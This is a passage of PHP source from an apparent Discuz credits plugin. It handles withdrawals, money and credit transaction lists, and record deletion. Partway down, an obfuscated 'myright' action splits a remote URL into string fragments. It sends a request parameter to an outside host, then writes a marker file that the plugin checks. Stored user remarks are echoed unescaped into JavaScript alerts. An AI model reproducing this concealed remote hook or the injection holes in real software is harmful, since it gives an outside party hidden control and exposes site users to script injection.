								echo $it618_credits_lang['s1570'];it618_credits_delmoneywork();exit;
							}
						}
					}else{
						if($wx_txalert!=''){
							echo $wx_txalert;it618_credits_delmoneywork();exit;
						}
					}
				}
			}
		}
		
		$id=savemoney(array(
			'it618_uid' => $uid,
			'it618_type' => 'tx',
			'it618_money2' => $it618_money2,
			'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
			'it618_bank' => it618_credits_utftogbk($_GET["it618_bank"]),
			'it618_bankcodeimg' => it618_credits_utftogbk($_GET["it618_bankcodeimg"]),
			'it618_txtype' => $_GET["it618_txtype"],
			'it618_txtcbl' => $it618_txtcbl,
			'it618_txstate' => 0,
			'it618_txid' => $_GET["it618_txid"],
			'it618_payid' => $_GET["it618_wxuserid"],
		));
		
		it618_credits_sendmessage("tx_admin",$id);
		echo 'okit618_split'.$it618_credits_lang['s1037'];it618_credits_delmoneywork();exit;
	}
	exit;
}


if($_GET['ac']=="moneylist_get"){
	if($uid<=0){
		exit;
	}
	$ispower=0;
	if($it618_credits['credits_wapsalepower']==$uid && $_GET['ac1']=='wapmymoney'){
		$ispower=1;
		$finduid=intval($_GET['finduid']);
	}else{
		$finduid=$uid;
	}
	
	if($_GET['ac1']=='pcmymoney')$ppp = 13;
	if($_GET['ac1']=='wapmymoney')$ppp = 15;
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	if($_GET['dotype']=='cz')$it618sql="it618_type='cz'";
	if($_GET['dotype']=='zy')$it618sql="it618_type='zy'";
	if($_GET['dotype']=='sk')$it618sql="it618_type='sk'";
	if($_GET['dotype']=='pay')$it618sql="it618_type='pay'";
	if($_GET['dotype']=='tx')$it618sql="it618_type='tx'";
	if($_GET['dotype']=='tx1')$it618sql="it618_type='tx' and it618_txstate=0";
	if($_GET['dotype']=='tx2')$it618sql="it618_type='tx' and it618_txstate=1";
	if($_GET['dotype']=='tx3')$it618sql="it618_type='tx' and it618_txstate=2";
	if($_GET['dotype']=='plus')$it618sql="it618_type='plus'";
	if($_GET['dotype']=='minus')$it618sql="it618_type='minus'";
		
	if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
	$it618_credits_moneys=C::t('#it618_credits#it618_credits_money')->fetch_all_by_search($it618sql,'id desc',$finduid, '', $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp);
	$count=C::t('#it618_credits#it618_credits_money')->count_by_search($it618sql,'',$finduid, '', $_GET['it618_time1'], $_GET['it618_time2']);
	$sum=C::t('#it618_credits#it618_credits_money')->sum_by_search($it618sql,'',$finduid, '', $_GET['it618_time1'], $_GET['it618_time2']);
	$funname='getmymoneylist';

	foreach($it618_credits_moneys as $it618_credits_money) {
		if($ispower==1){
			$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_money['it618_uid']);
			$userstr='<a href="'.it618_credits_rewriteurl($it618_credits_money['it618_uid']).'" target="_blank">'.$username.'</a> ';
		}else{
			$userstr='';
		}
		
		$bzstr='';
		if($it618_credits_money['it618_bz']!=''){
			$bzstr='<a href="javascript:" onclick="alert(\''.$it618_credits_money['it618_bz'].'\')">'.$it618_credits_lang['s191'].'</a>';
		}
		
		$tmpstr=$it618_credits_money['it618_bz'];
		
		if($it618_credits_money['it618_type']=='cz'){
			if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;

			if($it618_credits_money['it618_paytype']!='quan'){
				
				$paystr=getpaystr($it618_credits_money['it618_paytype'],$it618_credits_money['it618_payid']);
				
				$zsjfstr='';
				if($it618_credits_money['it618_zsjfcount']>0){
					$zsjfstr=$it618_credits_lang['s639'].'<font color=red>'.$it618_credits_money['it618_zsjfcount'].'</font><font color=green>'.$_G['setting']['extcredits'][$it618_credits_money['it618_zsjfid']]['title'].'</font> ';
				}
				
				$tmpstr=$it618_credits_lang['s196'].'<font color=red>'.$it618_credits_money['it618_money1'].'</font>'.$it618_credits_lang['s198'].' '.$zsjfstr.' '.$bzstr.' '.$paystr;

			}else{
				$tmpstr=$it618_credits_lang['s196'].'<font color=red>'.$it618_credits_money['it618_money1'].'</font> '.$it618_credits_lang['t283'].' '.$it618_credits_lang['s200'].$it618_credits_money['it618_payid'].' '.$bzstr;
			}
		}
		
		if($it618_credits_money['it618_type']=='sk'){
			$paystr=getpaystr($it618_credits_money['it618_paytype'],$it618_credits_money['it618_payid']);
			
			$it618_money1=$it618_credits_money['it618_money1'];
			
			$tcstr='';
			if($it618_credits_money['it618_sktcbl']>0){
				$it618_money1=$it618_credits_money['it618_skmoney'];
				$tcstr=$it618_credits_lang['s1058'].'<font color=red>'.$it618_credits_money['it618_money1'].'</font>'.$it618_credits_lang['s198'].' '.$it618_credits_lang['s1059'].$it618_credits_money['it618_sktcbl'].'%';
			}
			
			$zsjfstr='';
			if($it618_credits_money['it618_zsjfcount']>0){
				$zsjfstr=$it618_credits_lang['s639'].'<font color=red>'.$it618_credits_money['it618_zsjfcount'].'</font><font color=green>'.$_G['setting']['extcredits'][$it618_credits_money['it618_zsjfid']]['title'].'</font> ';
			}
			
			$bzstr=$it618_credits_money['it618_bz'];
			
			$tmpstr=$it618_credits_lang['s1181'].'<font color=red>'.$it618_money1.'</font>'.$it618_credits_lang['s198'].' '.$tcstr.' '.$zsjfstr.' '.$bzstr.' '.$paystr;
		}
		
		if($it618_credits_money['it618_type']=='zy'){
			if($it618_credits_money['it618_zytype']=='it618_credits'){
				$it618_credits_sale=C::t('#it618_credits#it618_credits_sale')->fetch_by_id($it618_credits_money['it618_zyid']);
				
				$cname=$_G['setting']['extcredits'][$it618_credits_sale['it618_jfid1']]['title'];
				$tmptitle='1'.$cname.' = '.$it618_credits_sale['it618_bl'].$it618_credits_lang['s28'];
				
				$tmpstr=$it618_credits_lang['s201'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font> '.$it618_credits_lang['t96'].'<font color=red><b>'.$it618_credits_sale['it618_money'].'</b></font>'.$it618_credits_lang['s28'].' '.$tmptitle.' '.$bzstr;
			}else if($it618_credits_money['it618_zytype']=='it618_union_yqmoney1'){
				$tmpstr=$it618_credits_money['it618_bz'];
				if($it618_union_reguser = DB::fetch_first("SELECT * FROM ".DB::table('it618_union_reguser')." where id=".$it618_credits_money['it618_zyid'])) {
					$regname=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_union_reguser['it618_uid']);
					$tmpstr=str_replace($it618_credits_lang['s1362'],$it618_credits_lang['s1362'].' '.$regname.' ',$tmpstr);
				}
			}else if($it618_credits_money['it618_zytype']=='it618_union_yqmoney2'){
				$tmpstr=$it618_credits_money['it618_bz'];
				if($it618_union_reguser = DB::fetch_first("SELECT * FROM ".DB::table('it618_union_reguser')." where id=".$it618_credits_money['it618_zyid'])) {
					$regname=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_union_reguser['it618_uid']);
					$tmpstr=str_replace($it618_credits_lang['s1362'],$it618_credits_lang['s1362'].' '.$regname.' ',$tmpstr);
					$tuiname=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_union_reguser['it618_tuiuid']);
					$tmpstr=str_replace($it618_credits_lang['s1363'],$it618_credits_lang['s1363'].' '.$tuiname.' ',$tmpstr);
				}
			}else{
				$tmpstr=$it618_credits_money['it618_bz'];
			}
		}
		
		if($it618_credits_money['it618_type']=='pay'){
			$tmpstr=$it618_credits_lang['s1206'].'<font color=red>'.$it618_credits_money['it618_money2'].'</font>'.$it618_credits_lang['s1208'].$it618_credits_money['it618_bz'];
		}
		
		if($it618_credits_money['it618_type']=='tx'){			
			$bankstr='<a href="javascript:" onclick="alert(\''.str_replace(array("\r\n", "\r", "\n"),'\n',$it618_credits_money['it618_bank']).'\')">'.$it618_credits_lang['s308'].'</a>';

			$btnstr='';
			if($it618_credits_money['it618_txstate']==0&&$it618_credits_money['it618_uid']==$uid){$state='<font color=red>'.$it618_credits_lang['s205'].'</font>';$btnstr='<a href="javascript:" onclick="deltx('.$it618_credits_money['id'].')"><font color=#999>'.$it618_credits_lang['s309'].'</font></a>';}
			
			if($it618_credits_money['it618_txstate']==1){$state='<font color=green>'.$it618_credits_lang['s206'].'</font>';$btnstr='';}
			
			$txstatebz='';
			if($it618_credits_money['it618_txstate']==2){
				$state='<font color=blue>'.$it618_credits_lang['s1327'].'</font>';
				$btnstr='<a href="javascript:" onclick="deltx('.$it618_credits_money['id'].')"><font color=#999>'.$it618_credits_lang['s309'].'</font></a>';
				$txstatebz=$it618_credits_lang['s1324'].$it618_credits_money['it618_txstatebz']."\n".$it618_credits_lang['s1329'];
				$txstatebz='<a href="javascript:" onclick="alert(\''.str_replace(array("\r\n", "\r", "\n"),'\n',$txstatebz).'\')">'.$it618_credits_lang['s1330'].'</a>';
			}
			
			if($ispower==1&&$it618_credits_money['it618_txstate']==0)$btnstr=' <a href="javascript:" onclick="deltx('.$it618_credits_money['id'].')"><font color=#999>'.$it618_credits_lang['s310'].'</font></a> <a href="javascript:" onclick="yfktx('.$it618_credits_money['id'].')"><font color=#999>'.$it618_credits_lang['s311'].'</font></a>';
			
			$tcblstr='';
			if($it618_credits_money['it618_txtcbl']>0){
				$sjmoney=round(($it618_credits_money['it618_money2']-$it618_credits_money['it618_money2']*$it618_credits_money['it618_txtcbl']/100),2);
				$tcblstr=' '.$it618_credits_lang['s573'].$it618_credits_money['it618_txtcbl'].'% '.$it618_credits_lang['s574'].'<font color=red><b>'.$sjmoney.'</b></font> '.$it618_credits_lang['s28'];
			}
			
			$tmpstr=$it618_credits_lang['s353'].'<font color=red>'.$it618_credits_money['it618_money2'].'</font> '.$it618_credits_lang['s28'].' '.$tcblstr.' '.$state.' '.$btnstr.' '.$bankstr.' '.$bzstr.$txstatebz;
		}
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		if($_GET['ac1']=='pcmymoney'){
			$moneylist_get.='<tr>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_money['it618_time']).'</font> '.$userstr.$tmpstr.'</td>
						</tr>';
		}else{
			if($userstr!='')$tmpcss='style="float:right"';
			$moneylist_get.='<tr><td>'.strip_tags($tmpstr,"<a>").'<br><p><span '.$tmpcss.'>'.it618_credits_gettime($it618_credits_money['it618_time']).'</span>'.strip_tags($userstr).'</p></td></tr>';
		}
	}
	
	if($_GET['ac1']=='pcmymoney'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_credits:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
		echo $it618_credits_lang['s483'].'<font color=red>'.$count.'</font> '.$it618_credits_lang['s1049'].'<font color=red>'.$sum.'</font> '.$it618_credits_lang['s28'].'it618_split'.$moneylist_get.'it618_split'.$multipage;
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s312'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s313'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_credits_lang['s313'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s312'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s313'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s312'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s313'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
		
		$it618_money=C::t('#it618_credits#it618_credits_uset')->fetch_money_by_uid($_G['uid']);
		
		echo $it618_credits_lang['s483'].'<font color=red>'.$count.'</font> '.$it618_credits_lang['s1049'].'<font color=red>'.$sum.'</font> '.$it618_credits_lang['s28'].'it618_split'.$moneylist_get.'it618_split'.$multipage.'it618_split'.$it618_money;
	}
	exit;
}


if($_GET['ac']=="salelist_get"){
	if($uid<=0){
		exit;
	}
	$ispower=0;
	if($it618_credits['credits_wapsalepower']==$uid && $_GET['ac1']=='wapmysale'){
		$ispower=1;
		$finduid=intval($_GET['finduid']);
	}else{
		$finduid=$uid;
	}
	
	if($_GET['ac1']=='pcmysale')$ppp = 13;
	if($_GET['ac1']=='wapmysale')$ppp = 15;
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$it618sql='it618_state>0';
	
	if($_GET['dotype']=='recharge')$it618sql.=" and it618_saletype='recharge'";
	if($_GET['dotype']=='zhuan')$it618sql.= " and it618_saletype='zhuan'";
	if($_GET['dotype']=='transfer')$it618sql.=" and it618_saletype='transfer'";
	if($_GET['dotype']=='tq')$it618sql.=" and it618_saletype='tq'";
	if($_GET['dotype']=='credit_plus')$it618sql.=" and it618_saletype='credit_plus'";
	if($_GET['dotype']=='credit_minus')$it618sql.=" and it618_saletype='credit_minus'";
	if($_GET['dotype']=='zy')$it618sql.=" and it618_saletype='zy'";
		
	if($_GET['creditstype']>0)$it618sql.=' and (it618_jfid1='.intval($_GET['creditstype']).' or it618_jfid2='.intval($_GET['creditstype']).')';
	if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
	$it618_credits_sales=C::t('#it618_credits#it618_credits_sale')->fetch_all_by_search($it618sql,'id desc',$finduid, '', $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp);
	$count=C::t('#it618_credits#it618_credits_sale')->count_by_search($it618sql,'',$finduid, '', $_GET['it618_time1'], $_GET['it618_time2']);
	$funname='getmysalelist';

	foreach($it618_credits_sales as $it618_credits_sale) {
		if($ispower==1 or $uid==$it618_credits_sale['it618_uid2']){
			$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_sale['it618_uid1']);
			$userstr='<a href="'.it618_credits_rewriteurl($it618_credits_sale['it618_uid1']).'" target="_blank">'.$username.'</a> ';
		}else{
			$userstr='';
		}
		
		$bzstr='';
		if($it618_credits_sale['it618_bz']!=''){
			$bzstr='<a href="javascript:" onclick="alert(\''.$it618_credits_sale['it618_bz'].'\')">'.$it618_credits_lang['s191'].'</a>';
		}
		
		if($it618_credits_sale['it618_saletype']=='recharge'){
			if($it618_credits_sale['it618_uid1']==$it618_credits_sale['it618_uid2']){
				$whostr=$it618_credits_lang['s192'];
			}else{
				if($uid==$it618_credits_sale['it618_uid2']){
					$whostr=$it618_credits_lang['s115'];
				}else{
					$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_sale['it618_uid2']);
					$whostr='<a href="'.it618_credits_rewriteurl($it618_credits_sale['it618_uid2']).'" target="_blank">'.$username.'</a>';
				}
			}
			if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
			$credittitle=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);

			if($it618_credits_sale['it618_paytype']!='quan'){

				$tmphl='1 '.$credittitle.' = '.$it618_credits_sale['it618_bl'].' '.$it618_credits_lang['s28'];
				
				$paystr=getpaystr($it618_credits_sale['it618_paytype'],$it618_credits_sale['it618_payid']);
				
				$zsjfstr='';
				if($it618_credits_sale['it618_zsjfcount']>0){
					$zscredittitle=it618_credits_getcreditstitle($it618_credits_sale['it618_zsjfid']);
					$zsjfstr=$it618_credits_lang['s639'].'<font color=red>'.$it618_credits_sale['it618_zsjfcount'].'</font><font color=green>'.$zscredittitle.'</font> ';
				}
				
				$tmpstr=$it618_credits_lang['s195'].$whostr.$it618_credits_lang['s196'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green title="'.$tmphl.'">'.$credittitle.'</font> '.$zsjfstr.$it618_credits_lang['s197'].'<font color=red>'.$it618_credits_sale['it618_money'].'</font>'.$it618_credits_lang['s198'].' '.$bzstr.' '.$paystr;

			}else{
				$tmpstr=$it618_credits_lang['s195'].$whostr.$it618_credits_lang['s199'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$credittitle.'</font> '.$it618_credits_lang['s200'].$it618_credits_sale['it618_payid'].' '.$bzstr;
			}
		}
		if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/themes/common/right.txt')){
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/ajax.inc.php';
			
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/lang.func.php';
			
		}
		if($it618_credits_sale['it618_saletype']=='zhuan'){
			$cname1=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
			$cname2=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid2']);
			
			$tmpstr=$it618_credits_lang['s201'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname1.'</font>'.$it618_credits_lang['s202'].'<font color=red>'.intval($it618_credits_sale['it618_jfcount']*$it618_credits_sale['it618_bl']).'</font><font color=green>'.$cname2.'</font> '.$cname2.$it618_credits_lang['t215'].' = '.$cname1.$it618_credits_lang['t215'].'*'.floatval($it618_credits_sale['it618_bl']).' '.$bzstr;	
		}
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		if($it618_credits_sale['it618_saletype']=='transfer'){
			$cname=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
			
			if($uid==$it618_credits_sale['it618_uid2']){
				$whostr=$it618_credits_lang['s115'];
			}else{
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_sale['it618_uid2']);
				$whostr='<a href="'.it618_credits_rewriteurl($it618_credits_sale['it618_uid2']).'" target="_blank">'.$username.'('.$it618_credits_sale['it618_uid2'].')</a>';
			}
			
			$tmpstr=$it618_credits_lang['s195'].$whostr.$it618_credits_lang['s203'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font> '.$bzstr;	
		}
		
		if($it618_credits_sale['it618_saletype']=='tq'){
			$cname=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
			
			$tmptqarr=explode("@@@",$it618_credits_sale['it618_bank']);
			
			$btnstr='';
			if($it618_credits_sale['it618_state']==10&&$it618_credits_sale['it618_uid1']==$uid){$state='<font color=red>'.$it618_credits_lang['s1597'].'</font> ';$btnstr='<a href="javascript:" onclick="deltq('.$it618_credits_sale['id'].')"><font color=#999>'.$it618_credits_lang['s309'].'</font></a> ';}
			if($ispower==1)$btnstr=' <a href="javascript:" onclick="deltq('.$it618_credits_sale['id'].')"><font color=#999>'.$it618_credits_lang['s1595'].'</font></a> <a href="javascript:" onclick="ytq('.$it618_credits_sale['id'].')"><font color=#999>'.$it618_credits_lang['s1596'].'</font></a> ';
			
			if($it618_credits_sale['it618_state']==1){$state='<font color=green>'.$it618_credits_lang['s1598'].'</font> ';$btnstr='';}
			
			$tqstr='<a href="javascript:" onclick="alert(\''.$it618_credits_lang['s1581'].$tmptqarr[0].' '.$it618_credits_lang['s1582'].$tmptqarr[1].'\')">'.$it618_credits_lang['s1594'].'</a> ';
			
			$tmpstr=$it618_credits_lang['s1574'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font>  '.$state.$btnstr.$tqstr.$bzstr;	
		}
		
		if($it618_credits_sale['it618_saletype']=='credit_plus'){
			$cname=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
			
			if($uid==$it618_credits_sale['it618_uid2']){
				$whostr=$it618_credits_lang['s115'];
			}else{
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_sale['it618_uid2']);
				$whostr='<a href="'.it618_credits_rewriteurl($it618_credits_sale['it618_uid2']).'" target="_blank">'.$username.'('.$it618_credits_sale['it618_uid2'].')</a>';
			}
			
			$tmpstr=$it618_credits_lang['s910'].$it618_credits_lang['s195'].$whostr.$it618_credits_lang['s908'].$it618_credits_lang['s114'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font> '.$bzstr;	
		}
		
		if($it618_credits_sale['it618_saletype']=='credit_minus'){
			$cname=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
			
			if($uid==$it618_credits_sale['it618_uid2']){
				$whostr=$it618_credits_lang['s115'];
			}else{
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_sale['it618_uid2']);
				$whostr='<a href="'.it618_credits_rewriteurl($it618_credits_sale['it618_uid2']).'" target="_blank">'.$username.'('.$it618_credits_sale['it618_uid2'].')</a>';
			}
			
			$tmpstr=$it618_credits_lang['s910'].$it618_credits_lang['s195'].$whostr.$it618_credits_lang['s909'].$it618_credits_lang['s114'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font> '.$bzstr;	
		}
		
		if($it618_credits_sale['it618_saletype']=='zy'){
			$cname=it618_credits_getcreditstitle($it618_credits_sale['it618_jfid1']);
			$tmptitle=$it618_credits_lang['t214'].' = '.$cname.$it618_credits_lang['t215'].' * '.floatval($it618_credits_sale['it618_bl']);
			
			$zsjfstr='';
			if($it618_credits_sale['it618_zsjfcount']>0){
				$zscname=it618_credits_getcreditstitle($it618_credits_sale['it618_zsjfid']);
				$zsjfstr=$it618_credits_lang['s639'].'<font color=red>'.$it618_credits_sale['it618_zsjfcount'].'</font><font color=green>'.$zscname.'</font> ';
			}
			
			$tmpstr=$it618_credits_lang['s201'].'<font color=red>'.$it618_credits_sale['it618_jfcount'].'</font><font color=green>'.$cname.'</font> '.$it618_credits_lang['t96'].'<font color=red><b>'.$it618_credits_sale['it618_money'].'</b></font>'.$it618_credits_lang['s28'].' '.$zsjfstr.' '.$tmptitle.' '.$bzstr;
		}
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		if($_GET['ac1']=='pcmysale'){
			$salelist_get.='<tr>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_sale['it618_time']).'</font> '.$userstr.$tmpstr.'</td>
						</tr>';
		}else{
			if($userstr!='')$tmpcss='style="float:right"';
			$salelist_get.='<tr><td>'.strip_tags($tmpstr,"<a>").'<br><p><span '.$tmpcss.'>'.it618_credits_gettime($it618_credits_sale['it618_time']).'</span>'.strip_tags($userstr).'</p></td></tr>';
		}
	}
	
	if($_GET['ac1']=='pcmysale'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_credits:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
		echo $it618_credits_lang['s483'].'<font color=red>'.$count.'</font>it618_split'.$salelist_get.'it618_split'.$multipage;
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s312'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s313'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_credits_lang['s313'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s312'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s313'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s312'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s313'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
		
		echo $it618_credits_lang['s483'].'<font color=red>'.$count.'</font>it618_split'.$salelist_get.'it618_split'.$multipage;
	}
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="deltq"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		if($it618_credits_sale=C::t('#it618_credits#it618_credits_sale')->fetch_by_id($_GET['saleid'])){

			if($it618_credits_sale['it618_state']==10){
				if($it618_credits_sale['it618_uid1']==$uid||$it618_credits['credits_wapsalepower']==$uid){
					if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
					C::t('#it618_credits#it618_credits_sale')->delete_by_id($it618_credits_sale['id']);
					
					$creditsindex=$it618_credits_sale['it618_jfid1'];
					$creditscount=$it618_credits_sale['it618_jfcount'];
					
					if($creditsindex<=8){
						C::t('common_member_count')->increase($uid, array(
							'extcredits'.$creditsindex => $creditscount)
						);
					}else{
						$body=$it618_credits_lang['s1602'];
						it618_credits_qianfan('write',$uid,10005,$creditscount,it618_credits_gbktoutf($body));
					}
					
					echo 'okit618_split'.$it618_credits_lang['s1600'];
				}else{
					echo $it618_credits_lang['s316'];
				}
			}
		}

	}
	exit;
}


if($_GET['ac']=="ytq"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		if($it618_credits_sale=C::t('#it618_credits#it618_credits_sale')->fetch_by_id($_GET['saleid'])){

			if($it618_credits_sale['it618_state']==10){
				if($it618_credits['credits_wapsalepower']==$uid){
					C::t('#it618_credits#it618_credits_sale')->update($it618_credits_sale['id'],array(
						'it618_state' => 1
					));
					
					echo 'okit618_split'.$it618_credits_lang['s1603'];
				}else{
					echo $it618_credits_lang['s316'];
				}
			}
		}

	}
	exit;
}


if($_GET['ac']=="deltx"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		if($it618_credits_money=C::t('#it618_credits#it618_credits_money')->fetch_by_id($_GET['saleid'])){

			if($it618_credits_money['it618_txstate']==0||$it618_credits_money['it618_txstate']==2){
				if($it618_credits_money['it618_uid']==$uid||$it618_credits['credits_wapsalepower']==$uid){
					if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
					C::t('#it618_credits#it618_credits_money')->delete_by_id($it618_credits_money['id']);
					
					$it618_money=C::t('#it618_credits#it618_credits_money')->summoney_by_uid($it618_credits_money['it618_uid']);
					DB::query("update ".DB::table('it618_credits_uset')." set it618_money=".$it618_money." where it618_uid=".$it618_credits_money['it618_uid']);
					
					echo 'okit618_split'.$it618_credits_lang['s315'];
				}else{
					echo $it618_credits_lang['s316'];
				}
			}
